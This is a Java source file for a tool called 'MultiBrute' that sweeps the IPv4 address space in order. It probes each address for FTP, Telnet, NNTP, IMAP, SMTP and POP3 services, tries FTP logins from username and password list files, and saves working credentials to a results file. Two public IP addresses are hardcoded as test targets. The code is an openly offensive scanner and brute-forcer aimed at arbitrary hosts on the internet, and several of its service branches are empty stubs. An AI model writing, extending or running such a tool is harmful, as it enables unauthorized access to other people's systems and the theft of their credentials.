package Default;


import org.apache.commons.net.SocketClient;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;


import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.ConnectException;
import java.net.SocketException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.Path;


import org.apache.commons.net.ftp.FTPReply;
import org.apache.commons.net.imap.IMAPClient;
import org.apache.commons.net.nntp.NNTPClient;
import org.apache.commons.net.pop3.POP3Client;
import org.apache.commons.net.smtp.SMTPClient;
import org.apache.commons.net.telnet.TelnetClient;






public class  Main{

		
public static	FTPClient		ftpclient		=	new FTPClient();
public static	TelnetClient	telnetclient	=	new TelnetClient();
public static	NNTPClient		nntpclient		=	new NNTPClient();
public static	IMAPClient		imapclient		=	new IMAPClient();
public static	SMTPClient		smtpclient		=	new SMTPClient();
public static	POP3Client		pop3client		=	new POP3Client();



	
	  public static void main(String[] args) throws IOException{
	    	
		  
			System.out.println("####### MultiBrute by Alexejewitsch #######");
			System.out.println("FTP, Telnet");
			
			
			
		  //file create/check
		  	createlog();
		  	checkpassword();
		  	checkusername();
	        
		  	//timeouts
	        ftpclient.setConnectTimeout(250);
	        telnetclient.setConnectTimeout(250);
	        nntpclient.setConnectTimeout(250);
	        imapclient.setConnectTimeout(250);
	        smtpclient.setConnectTimeout(250);
	        pop3client.setConnectTimeout(250);
	        
	        //password und username in array
			Path userpath=Paths.get("username.txt");
			Path passpath=Paths.get("password.txt");
			String[] username = Files.readAllLines(userpath).toArray(new String[0]);
			String[] password = Files.readAllLines(passpath).toArray(new String[0]);

	   
			
			
			
			
			//send magic packet
			boolean magic=true;
			
			
			
			
	        //letzte ip als start ip einlesen
				FileReader	getlog = new FileReader("logfile.txt");
		        BufferedReader bufferedlog = new BufferedReader(getlog);
		        String startip = bufferedlog.readLine();
		        System.out.println("Last IP: "+startip);
		        bufferedlog.close();
		        getlog.close();
	        
	        // startip="90.130.70.73";
	        String endip="255.255.255.255";    
	        
	        int reply;
	        
	       //Test FTP IP        
	       String ftpIP="90.130.70.73";

	       //Telnet IP Test
	       String telnetIP="80.153.193.93";

	       
	        while(!(startip.equals(endip))) {	        	
	        	
	        	
	        	
	        	
	        	//FTP Code
	        	
	        	if(isFTPServer(startip)){
	        		try {
	        			
	        			System.out.println("Trying login FTP....");
	        			
		        		ftpclient.connect(startip);

		        		for(int i=0;i<password.length;i++) {
						ftpclient.login(username[i], password[i]);
						
					      System.out.println(ftpclient.getReplyString());
					      
					      reply = ftpclient.getReplyCode();

					      if(FTPReply.isPositiveCompletion(reply)) {
					    	  System.out.println("HIT");
					    	  
					    	  PrintWriter pw=new PrintWriter(new FileWriter("result.txt", true));
						            pw.println("FTP"+"\t" + startip+"\t"+username[i]+"\t"+password[i]);
						            pw.close (); 
					    	  
					        ftpclient.disconnect();
					      }else {
					    	  System.out.println("Fail");

					      }}
					          
					} catch (IOException e) {
						//e.printStackTrace();
					}
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		//Telnet code
	        		
	        	}if(isTelnetServer(startip)) {
	        		

		        		
	        		PrintWriter pw=new PrintWriter(new FileWriter("result.txt", false));
						            pw.println("Telnet"+"\t" + startip);
						            pw.close (); 
					    	  
			
		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        		
	        	}if (isNntpServer(startip)) {
	        		
	        	}if(isImapServer(startip)) {
	        		
	        	}if(isSmtpServer(startip)) {
	        		
	        	}if(isPop3Server(startip)) {
	        		
	        	}
	        	
	        	startip=addIPAddress(startip);
	        	
	        	
	        	

	        	
	           
	           try (PrintWriter pw=new PrintWriter(new FileWriter("logfile.txt", false))){
	            pw.print(startip);
	            pw.close (); 
	            }
	           
	           
	          
	    	//client.connect(allIps[i]);
	       // client.enterLocalPassiveMode();
	        
	        
	       // client.login("anonymous", "");
	        
	        
	        
	     //  FTPFile[] files = client.listFiles("/pub");
	       // for (FTPFile file : files) {
	       //     System.out.println(file.getName());
	       // }
	        		}

	        }

	    
		private static boolean isFTPServer(String host){
			boolean isConnected = false;
			try {
				System.out.println("Scanning_FTP:" + host);
				ftpclient.connect(host);
				isConnected = ftpclient.isConnected();
				//System.out.println("isConnected()=" + isConnected);
				if(isConnected){
					ftpclient.disconnect();
					System.out.println("FTP Server gefunden");
				}
				
			}catch(ConnectException e){ // java.net.ConnectException: Connection timed out: connect
				//System.out.println("ConnectException");
				//e.printStackTrace();
			}catch (SocketException e) {
				//System.out.println("SocketException");
				//e.printStackTrace();
			} catch (IOException e) {
				//System.out.println("IOException");
				//e.printStackTrace();
			}
			return isConnected;
		}

		
		private static boolean isTelnetServer(String host){
			boolean isConnected = false;
			try {
				System.out.println("Scanning_Telnet:" + host);
				telnetclient.connect(host);
				isConnected = telnetclient.isConnected();
				//System.out.println("isConnected()=" + isConnected);
				if(isConnected){
					telnetclient.disconnect();
					System.out.println("Telnet Server gefunden");
				}
				
			}catch(ConnectException e){ // java.net.ConnectException: Connection timed out: connect
				//System.out.println("ConnectException");
				//e.printStackTrace();
			}catch (SocketException e) {
				//System.out.println("SocketException");
				//e.printStackTrace();
			} catch (IOException e) {
				//System.out.println("IOException");
				//e.printStackTrace();
			}
			return isConnected;
		}

		
		
		private static boolean isNntpServer(String host){
			boolean isConnected = false;
			try {
				System.out.println("Scanning_Nntp:" + host);
				nntpclient.connect(host);
				isConnected = nntpclient.isConnected();
				//System.out.println("isConnected()=" + isConnected);
				if(isConnected){
					nntpclient.disconnect();
					System.out.println("NNTP Server gefunden");
				}
				
			}catch(ConnectException e){ // java.net.ConnectException: Connection timed out: connect
				//System.out.println("ConnectException");
				//e.printStackTrace();
			}catch (SocketException e) {
				//System.out.println("SocketException");
				//e.printStackTrace();
			} catch (IOException e) {
				//System.out.println("IOException");
				//e.printStackTrace();
			}
			return isConnected;
		}
		
		
		
		private static boolean isImapServer(String host){
			boolean isConnected = false;
			try {
				System.out.println("Scanning_Imap:" + host);
				imapclient.connect(host);
				isConnected = imapclient.isConnected();
				//System.out.println("isConnected()=" + isConnected);
				if(isConnected){
					imapclient.disconnect();
					System.out.println("IMAP Server gefunden");
				}
				
			}catch(ConnectException e){ // java.net.ConnectException: Connection timed out: connect
				//System.out.println("ConnectException");
				//e.printStackTrace();
			}catch (SocketException e) {
				//System.out.println("SocketException");
				//e.printStackTrace();
			} catch (IOException e) {
				//System.out.println("IOException");
				//e.printStackTrace();
			}
			return isConnected;
		}
		
		private static boolean isSmtpServer(String host){
			boolean isConnected = false;
			try {
				System.out.println("Scanning_SMTP:" + host);
				smtpclient.connect(host);
				isConnected = smtpclient.isConnected();
				//System.out.println("isConnected()=" + isConnected);
				if(isConnected){
					smtpclient.disconnect();
					System.out.println("SMTP Server gefunden");
				}
				
			}catch(ConnectException e){ // java.net.ConnectException: Connection timed out: connect
				//System.out.println("ConnectException");
				//e.printStackTrace();
			}catch (SocketException e) {
				//System.out.println("SocketException");
				//e.printStackTrace();
			} catch (IOException e) {
			//	System.out.println("IOException");
				//e.printStackTrace();
			}
			return isConnected;
		}
		
		
		private static boolean isPop3Server(String host){
			boolean isConnected = false;
			try {
				System.out.println("Scanning_POP3:" + host);
				pop3client.connect(host);
				isConnected = pop3client.isConnected();
				//System.out.println("isConnected()=" + isConnected);
				if(isConnected){
					pop3client.disconnect();
					System.out.println("POP3 Server gefunden");
				}
				
			}catch(ConnectException e){ // java.net.ConnectException: Connection timed out: connect
				//System.out.println("ConnectException");
				//e.printStackTrace();
			}catch (SocketException e) {
				//System.out.println("SocketException");
				//e.printStackTrace();
			} catch (IOException e) {
			//	System.out.println("IOException");
				//e.printStackTrace();
			}
			return isConnected;
		}
		
		private static String addIPAddress(String ip){
			String[] buf = ip.split("[.]");
			Integer[] work = new Integer[4];
			for(int i = 0; i < 4; i++){
				work[i] = Integer.valueOf(buf[i]);
			}
			work[3]++;
			for(int i = 3; i >= 0; i--){
				if(work[i] >= 256){
					work[i] = 0;
					if(i > 0){
						work[i-1]++;
					}else{
						
					}
				}
			}
			return work[0] + "." + work[1] + "."+ work[2] + "." + work[3];
		}
		
		


	
		  private static void createlog() {
		    try {
		      File logfile = new File("logfile.txt");
		      if (logfile.createNewFile()) {
		        System.out.println("Logfile created");
		      } else {
		        System.out.println("Logfile already exists.");
		      }
		    } catch (IOException e) {
		      System.out.println("An error occurred.");
		      e.printStackTrace();
		    }
		  }
		  
		  private static void checkpassword() {
			  if(Files.exists(Paths.get("password.txt"))) { 
				 System.out.println("Password File found");
				}else {
					 System.out.println("Password File not found aborting");
					 System.exit(0);
				}
			  
		  }
		  
		  private static void checkusername() {
			  if(Files.exists(Paths.get("username.txt"))) { 
				 System.out.println("Username File found");
				}else {
					 System.out.println("Username File not found aborting");
					 System.exit(0);
				}
		  }
		  
		} 